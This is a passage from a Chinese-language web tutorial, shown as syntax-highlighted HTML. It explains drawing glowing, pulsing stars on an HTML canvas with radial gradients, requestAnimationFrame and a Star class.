&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fillStyle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;#fff&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">beginPath&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">arc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">PI&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 参数分别为坐标x,y,半径，起始弧度，结束弧度
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fill&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样就画完了一个实心圆。&lt;/p>
&lt;p>需要注意，canvas 的大小通过 css 设置可能导致画面被拉伸变形模糊，所以最好的办法是绘制前确定一下 canvas 的大小。&lt;/p>
&lt;p>此外需要注意的是，重置大小会导致画面清空，用这种方式可以替代&lt;code>fillRect&lt;/code>或者&lt;code>clearRect&lt;/code>，有的浏览器平台更快但也有浏览器更慢。可以查阅这篇&lt;a class="link" href="https://www.html5rocks.com/en/tutorials/canvas/performance/#toc-pre-render?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener"
>博文&lt;/a>来参考如何提升 canvas 绘图性能。&lt;/p>
&lt;p>&lt;code>fillStyle&lt;/code>可以使用 css 的颜色代码，也就是说我们可以写下诸如&lt;code>rgba&lt;/code>、&lt;code>hsla&lt;/code>之类的颜色，这给我们编写代码提供了很多方便。&lt;/p>
&lt;h3 id="13-绘制星星">1.3 绘制星星&lt;/h3>
&lt;p>星空是由星星组成的这显然不用多说了，先来看如何绘制单个星星。&lt;/p>
&lt;p>星星的绘制方法很多，贴图虽然便利但显然不够灵活，我们的星星是要随节奏改变亮度和大小的，利用贴图的话就只能在&lt;code>alpha&lt;/code>值和&lt;code>drawImage&lt;/code>缩放来处理了。虽然是一种不错的办法，不过这里我使用了&lt;code>RadialGradient&lt;/code>来控制绘图。&lt;/p>
&lt;blockquote>
&lt;p>PS：&lt;code>RadialGradient&lt;/code> 的性能比较差，大量使用会导致明显的性能下降，这是一个显著降低绘制效率的地方。&lt;/p>
&lt;/blockquote>
&lt;p>那么，我们先画一个圆（加点细节预警）。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">const&lt;/span> &lt;span class="nx">canvas&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;background-canvas&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">ctx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;2d&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 确保不会变形
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">width&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">offsetWidth&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">height&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">offsetHeight&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 参数分别为起始坐标x,y,半径，结束坐标x,y,半径
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">gradient&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createRadialGradient&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0.025&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;#fff&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 中心的亮白色
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0.1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;rgba(255, 255, 255, 0.9)&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 核心光点和四周的分界线
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0.25&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;hsla(198, 66%, 75%, 0.9)&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 核心亮点往四周发散的蓝光
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0.75&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;hsla(198, 64%, 33%, 0.4)&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 蓝光边缘
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;hsla(198, 64%, 33%, 0)&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 淡化直至透明
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fillStyle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">gradient&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">beginPath&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">arc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">PI&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fill&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以在&lt;a class="link" href="https://codepen.io/weak_ptr/pen/KrzwPV" target="_blank" rel="noopener"
>codepen&lt;/a>查看效果或直接编辑你的星（圈）星（圈）。&lt;/p>
&lt;p>看上去还不错？&lt;/p>
&lt;p>让我们用代码控制它的亮度和大小。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">const&lt;/span> &lt;span class="nx">canvas&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;background-canvas&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">ctx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;2d&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 确保不会变形
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">width&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">offsetWidth&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">height&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">offsetHeight&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 通过energy控制亮度和大小
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">let&lt;/span> &lt;span class="nx">energy&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">255&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">radius&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">energyChangeRate&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">draw&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">requestAnimationFrame&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">draw&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 定时绘制，requestAnimationFrame比setTimeout更好。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">energy&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nx">energyChangeRate&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// 见过呼吸灯吧？我们让它变亮~再变暗~反复循环~
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">energy&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">energy&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">255&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">energyChangeRate&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">energyChangeRate&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 计算出当前的大小
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kr">const&lt;/span> &lt;span class="nx">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">radius&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">energy&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mf">0.1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 清空屏幕
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fillStyle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;black&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fillRect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">width&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">height&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 参数分别为起始坐标x,y,半径，结束坐标x,y,半径
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kr">const&lt;/span> &lt;span class="nx">gradient&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createRadialGradient&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0.025&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;#fff&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 中心的亮白色
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0.1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;rgba(255, 255, 255, 0.9)&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 核心光点和四周的分界线
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="mf">0.25&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="sb">`hsla(198, 66%, &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">min&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">75&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">energy&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mf">0.01&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">%, 0.9)`&lt;/span>
&lt;span class="p">);&lt;/span> &lt;span class="c1">// 核心亮点往四周发散的蓝光
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="mf">0.75&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="sb">`hsla(198, 64%, &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">min&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">33&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">energy&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mf">0.01&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">%, 0.4)`&lt;/span>
&lt;span class="p">);&lt;/span> &lt;span class="c1">// 蓝光边缘
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;hsla(198, 64%, 33%, 0)&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 淡化直至透明
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fillStyle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">gradient&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">beginPath&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">arc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">PI&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fill&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">draw&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以在&lt;a class="link" href="https://codepen.io/weak_ptr/pen/LXNEaa" target="_blank" rel="noopener"
>codepen&lt;/a>查看并编辑效果。&lt;/p>
&lt;h3 id="14-封装星星">1.4 封装星星&lt;/h3>
&lt;p>通常来说粒子系统不大会把单个粒子封装成类，因为函数调用的开销还是蛮大的。。。&lt;/p>
&lt;p>不过在这里我们这里就先这样了，方便理解和阅读。渲染的瓶颈解决之前，粒子函数调用这点开销根本不是回事儿。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">const&lt;/span> &lt;span class="nx">canvas&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;background-canvas&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">ctx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;2d&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 确保不会变形
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">width&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">offsetWidth&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">height&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">offsetHeight&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 用javascript原生的class而不是prototype
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kr">class&lt;/span> &lt;span class="nx">Star&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">constructor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">y&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">radius&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">lightness&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">radius&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">radius&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">x&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">y&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">y&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">lightness&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">draw&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">energy&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 计算出当前的大小
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kr">const&lt;/span> &lt;span class="nx">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">radius&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">energy&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mf">0.1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 参数分别为起始坐标x,y,半径，结束坐标x,y,半径
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kr">const&lt;/span> &lt;span class="nx">gradient&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createRadialGradient&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">r&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0.025&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;#fff&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 中心的亮白色
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0.1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;rgba(255, 255, 255, 0.9)&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 核心光点和四周的分界线
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="mf">0.25&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="sb">`hsla(198, 66%, &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">min&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">75&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">energy&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mf">0.01&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">%, 0.9)`&lt;/span>
&lt;span class="p">);&lt;/span> &lt;span class="c1">// 核心亮点往四周发散的蓝光
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="mf">0.75&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="sb">`hsla(198, 64%, &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">min&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">33&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">energy&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mf">0.01&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">%, 0.4)`&lt;/span>
&lt;span class="p">);&lt;/span> &lt;span class="c1">// 蓝光边缘
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">gradient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addColorStop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;hsla(198, 64%, 33%, 0)&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 淡化直至透明
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fillStyle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">gradient&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">beginPath&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">arc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">PI&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fill&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">star&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Star&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">energy&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">255&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">energyChangeRate&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 渲染函数来循环渲染！
